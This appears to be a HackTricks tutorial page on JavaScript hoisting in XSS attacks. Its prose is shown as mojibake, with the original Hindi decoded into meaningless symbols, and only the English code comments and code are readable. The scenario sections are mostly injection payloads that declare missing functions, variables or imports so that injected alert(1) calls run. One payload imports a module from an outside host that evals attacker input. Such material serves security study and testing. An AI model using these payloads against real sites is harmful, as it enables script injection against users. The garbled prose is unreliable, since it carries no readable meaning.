# JS Hoisting

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛрдЬрд╝ рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

{% hint style="success" %}
JavaScript Hoisting рдХрд╛ рдЕрд░реНрде рд╣реИ рд╡рд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬрд┐рд╕рдореЗрдВ **рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рдлрд╝рдВрдХреНрд╢рдиреНрд╕, рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕, рдХреНрд▓рд╛рд╕реЗрд╕, рдпрд╛ рдЗрдореНрдкреЛрд░реНрдЯреНрд╕ рдХреЗ рдШреЛрд╖рдгрд╛ рдХреЛ рдкреНрд░рддреАрдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рд╕реЗ рдкрд╣рд▓реЗ, рдЙрдирдХреЗ рд╕реНрдХреЛрдк рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ**.
{% endhint %}

JavaScript рдЗрдВрдЬрди рдХрд┐рд╕реА рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрд░ (рдХрдо рд╕реЗ рдХрдо рджреЛ) рдкрд╛рд╕ рдХрд░реЗрдЧрд╛ред рдпрд╣ рдПрдХ рдмрдбрд╝реА рд╕рд░рд▓реАрдХрд░рдг рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдо JS рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рджреЛ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрдиреЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЛрдЪ рд╕рдХрддреЗ рд╣реИрдВред **рдкрд╣рд▓реЗ, рдХреЛрдб рдХрд╛ рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдЬрд┐рд╕рдореЗрдВ **рд╕рд┐рдВрдЯреИрдХреНрд╕ рддреНрд░реБрдЯрд┐рдпреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдФрд░ рдЗрд╕реЗ рдПрдХ рдЕрдореВрд░реНрдд рд╕рд┐рдВрдЯреИрдХреНрд╕ рдЯреНрд░реА рдореЗрдВ рдмрджрд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕ рдЪрд░рдг рдореЗрдВ рд╡рд╣ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо **hoisting** рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд░реНрдгрди рдХрд░рддреЗ рд╣реИрдВ, рдЬрд╣рд╛рдВ рдХреБрдЫ рдкреНрд░рдХрд╛рд░ рдХреЗ рдШреЛрд╖рдгрд╛рдУрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рд╕реНрдЯреИрдХ рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ "рд▓реЗ рдЬрд╛рдпрд╛" (hoisted) рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдХреЛрдб рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдЪрд░рдг рдХреЛ рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЗрдВрдЬрди **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИ**ред

1. рдХреЛрдИ рднреА рдХреЛрдб (рдЗрдВрдЬреЗрдХреНрдЯреЗрдб рдкреЗрд▓реЛрдб рд╕рд╣рд┐рдд) рд╕рд┐рдВрдЯреИрдХреНрд╕ рдирд┐рдпрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред **рдпрджрд┐ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдЕрдорд╛рдиреНрдп рд╣реИ рддреЛ рдЕрдВрддрд┐рдо рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдХрд╣реАрдВ рднреА рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред
2. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдХреЛрдб рдХрд╣рд╛рдВ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИ рдЗрд╕рдХрд╛ рдорд╣рддреНрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдХрд╛ рдкрд╛рда рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рд╡рд╣реА рдирд╣реАрдВ рд╣реИ рдЬреЛ рдЕрдВрдд рдореЗрдВ рд░рдирдЯрд╛рдЗрдо рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдХрд┐рд╕реА рднреА рднрд╛рд╖рд╛ рдореЗрдВ рдирд┐рдпрдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рддрдп рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдХреНрд░рдо рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИред

### рд╣реЛрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рдЪрд╛рд░ рдкреНрд░рдХрд╛рд░

MDN рдХреЗ рд╣реЛрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд╡рд░реНрдгрди рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рддреЗ рд╣реБрдП, рд╣рдо рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ JavaScript рдореЗрдВ рдЪрд╛рд░ рдкреНрд░рдХрд╛рд░ рдХреА рд╣реЛрд╕реНрдЯрд┐рдВрдЧ рд╣реЛрддреА рд╣реИред рдлрд┐рд░ рд╕реЗ, MDN рд╕реЗ рд╕реАрдзреЗ:

> 1. рдЗрд╕рдХреЗ рдШреЛрд╖рд┐рдд рд╣реЛрдиреЗ рдХреА рдкрдВрдХреНрддрд┐ рд╕реЗ рдкрд╣рд▓реЗ рдЙрд╕рдХреЗ рд╕реНрдХреЛрдк рдореЗрдВ рдПрдХ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреЗ рдореВрд▓реНрдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ред ("рдореВрд▓реНрдп рд╣реЛрд╕реНрдЯрд┐рдВрдЧ")
> 2. рдЗрд╕рдХреЗ рдШреЛрд╖рд┐рдд рд╣реЛрдиреЗ рдХреА рдкрдВрдХреНрддрд┐ рд╕реЗ рдкрд╣рд▓реЗ рдЙрд╕рдХреЗ рд╕реНрдХреЛрдк рдореЗрдВ рдПрдХ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рд╕рдВрджрд░реНрдн рд▓реЗрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛, рдмрд┐рдирд╛ `ReferenceError` рдлреЗрдВрдХреЗ, рд▓реЗрдХрд┐рди рдореВрд▓реНрдп рд╣рдореЗрд╢рд╛ `undefined` рд╣реЛрддрд╛ рд╣реИред ("рдШреЛрд╖рдгрд╛ рд╣реЛрд╕реНрдЯрд┐рдВрдЧ")
> 3. рд╡реЗрд░рд┐рдПрдмрд▓ рдХреА рдШреЛрд╖рдгрд╛ рдЗрд╕рдХреЗ рдШреЛрд╖рд┐рдд рд╣реЛрдиреЗ рдХреА рдкрдВрдХреНрддрд┐ рд╕реЗ рдкрд╣рд▓реЗ рдЙрд╕рдХреЗ рд╕реНрдХреЛрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдкрд░рд┐рд╡рд░реНрддрди рдХрд╛ рдХрд╛рд░рдг рдмрдирддреА рд╣реИред
> 4. рдПрдХ рдШреЛрд╖рдгрд╛ рдХреЗ рдкрд╛рд░реНрд╢реНрд╡ рдкреНрд░рднрд╛рд╡ рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдмрд╛рдХреА рдХреЛрдб рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЙрддреНрдкрдиреНрди рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдмрд╛рдж

> рдКрдкрд░ рдХреЗ рдЪрд╛рд░ рдлрд╝рдВрдХреНрд╢рди рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рдХрд╛рд░ 1 рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рд╕рд╛рде рд╣реЛрд╕реНрдЯреЗрдб рд╣реЛрддреА рд╣реИрдВ; `var` рдШреЛрд╖рдгрд╛ рдкреНрд░рдХрд╛рд░ 2 рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рд╕рд╛рде рд╣реЛрд╕реНрдЯреЗрдб рд╣реЛрддреА рд╣реИ; [`let`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/let), [`const`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/const), рдФрд░ [`class`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/class) рдШреЛрд╖рдгрд╛рдПрдБ (рдЬрд┐рдиреНрд╣реЗрдВ рд╕рд╛рдореВрд╣рд┐рдХ рд░реВрдк рд╕реЗ _рд▓реЗрдХреНрд╕рд┐рдХрд▓ рдШреЛрд╖рдгрд╛рдПрдБ_ рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ) рдкреНрд░рдХрд╛рд░ 3 рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рд╕рд╛рде рд╣реЛрд╕реНрдЯреЗрдб рд╣реЛрддреА рд╣реИрдВ; [`import`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import) рдШреЛрд╖рдгрд╛рдПрдБ рдкреНрд░рдХрд╛рд░ 1 рдФрд░ рдкреНрд░рдХрд╛рд░ 4 рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЗ рд╕рд╛рде рд╣реЛрд╕реНрдЯреЗрдб рд╣реЛрддреА рд╣реИрдВред

## рдкрд░рд┐рджреГрд╢реНрдп

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдРрд╕реЗ рдкрд░рд┐рджреГрд╢реНрдп рд╣реИрдВ рдЬрд╣рд╛рдВ рдЖрдк **рдПрдХ рдЕрдШреЛрд╖рд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдмрд╛рдж JS рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЖрдк **рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХреЛ рдареАрдХ рдХрд░рдХреЗ** рдЗрд╕реЗ рдШреЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рддрд╛рдХрд┐ рдЖрдкрдХрд╛ рдХреЛрдб рдПрдХ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХрдиреЗ рдХреЗ рдмрдЬрд╛рдп рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рдЬрд╛рдП):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn┬┤t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## рдЕрдзрд┐рдХ рдкрд░рд┐рджреГрд╢реНрдп
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## рд╕рдВрджрд░реНрдн

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
